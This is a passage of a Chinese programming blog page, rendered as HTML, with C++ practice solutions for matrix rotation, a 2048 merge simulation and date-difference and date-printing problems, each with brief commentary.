class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">two</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">data[i][j] = s[j][m<span class="number">-1</span>-i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">three</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">data[i][j] = s[i][m-j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">s[i][j] = data[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m, k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m &gt;&gt; k)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cin &gt;&gt; s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line"><span class="type">int</span> k_;</span><br><span class="line">cin &gt;&gt; k_;</span><br><span class="line"><span class="keyword">if</span>(k_ == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">one</span>(n, m);</span><br><span class="line"><span class="type">int</span> tmp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">two</span>(n, m);</span><br><span class="line"><span class="type">int</span> tmp = m;</span><br><span class="line">m = n;</span><br><span class="line">n = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">three</span>(n, m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="section">2048</h3><p>我是每次反着遍历，然后把找不为0的值，如果下一个不相等就存在一个数组里，如果找到相等的就*2再存。每次找到不等于0的值一定要存，在这里卡了很久。</p><p>看别人的答案是比较规矩的：先移到一侧，再合并，再移到一侧。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">cin &gt;&gt; s[i][j]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">3</span>)&#123;</span><br><span class="line"><span class="type">int</span> jud = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = j+<span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">s[j][i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> jud = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">s[j][i] = tmp[<span class="number">3</span>-j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j!=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="type">int</span> jud = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">s[i][j] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> jud = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">s[i][j] = tmp[<span class="number">3</span>-j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="日期">日期</h2><h3 id="日期差值">日期差值</h3><p>同一年用一个函数来写；</p><p>不同年的拆成三部分，第一年数据到年底、中间、第二年年初到数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span>&#123;</span><br><span class="line"><span class="type">int</span> year, month, day;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cal_days</span><span class="params">(<span class="keyword">struct</span> data d1, <span class="keyword">struct</span> data d2)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d1.month == d2.month) ans = d2.day - d1.day + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(d1.year))&#123;</span><br><span class="line">f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f[d1.month] -= d1.day;</span><br><span class="line">ans = d2.day + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = d1.month; i &lt; d2.month; i++)&#123;</span><br><span class="line">ans += f[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> r1[<span class="number">10</span>], r2[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; r1 &gt;&gt; r2)&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span> d1, d2;</span><br><span class="line">d1.year = (r1[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r1[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r1[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d1.month = (r1[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d1.day = (r1[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.year = (r2[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r2[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r2[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.month = (r2[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.day = (r2[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d1.year &lt;&lt; &quot;-&quot; &lt;&lt; d1.month &lt;&lt; &quot;-&quot; &lt;&lt; d1.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d2.year &lt;&lt; &quot;-&quot; &lt;&lt; d2.month &lt;&lt; &quot;-&quot; &lt;&lt; d2.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d1.year == d2.year)&#123;</span><br><span class="line">ans = <span class="built_in">cal_days</span>(d1, d2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">struct</span> data d3 = &#123;</span><br><span class="line">d1.year,</span><br><span class="line"><span class="number">12</span>,</span><br><span class="line"><span class="number">31</span></span><br><span class="line">&#125;;</span><br><span class="line">ans += <span class="built_in">cal_days</span>(d1, d3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = d1.year+<span class="number">1</span>; i &lt; d2.year; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(i)) ans += <span class="number">366</span>;</span><br><span class="line"><span class="keyword">else</span> ans += <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span> d4 = &#123;</span><br><span class="line">d2.year,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">ans += <span class="built_in">cal_days</span>(d4, d2);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="打印日期">打印日期</h3><p>格式化输出啥的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> y, d;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; y &gt;&gt; d)&#123;</span><br><span class="line"><span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span 